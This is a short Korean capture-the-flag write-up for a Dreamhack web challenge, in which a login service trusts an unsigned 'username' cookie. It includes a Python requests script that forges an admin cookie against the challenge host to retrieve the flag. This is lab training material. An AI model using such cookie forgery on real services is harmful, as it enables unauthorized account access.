# Category

web

# Overview

쿠키로 인증 상태를 관리하는 간단한 로그인 서비스입니다.
admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.

플래그 형식은 DH{...} 입니다.

# Analysis

- 제시된 파이썬 코드를 통해 유저는 `guest`와 `admin`이 존재한다는 것을 알 수 있으며, `admin`에 대한 `value`로 flag가 설정되어있는 것을 확인할 수 있다.
- 제시된 플라스크 코드에서 `POST /login` 요청 시 입력한 `username`과 `password`를 이용하여 사용자가 맞다면 `username`이라는 쿠키를 심어서 돌려준다.
- 해당 쿠키는 `GET /` 경로에서 `username`이 `admin`인 쿠키를 가지고 있다면 flag를 알려주는 코드가 존재한다는 것을 확인할 수 있다.

# Exploitation

`GET /` 요청 시 `username: admin` 쿠키를 강제로 삽입하여, flag를 획득할 수 있다.

```python
import re
from requests import request as req

res = req(
    url="http://host8.dreamhack.games:8630/",
    method="GET",
    cookies={'username': 'admin'}
)

flag = re.search("DH{.*}", res.text)

print(flag.group() if flag else "No flag")
```

# Flag

`DH{79...56}`
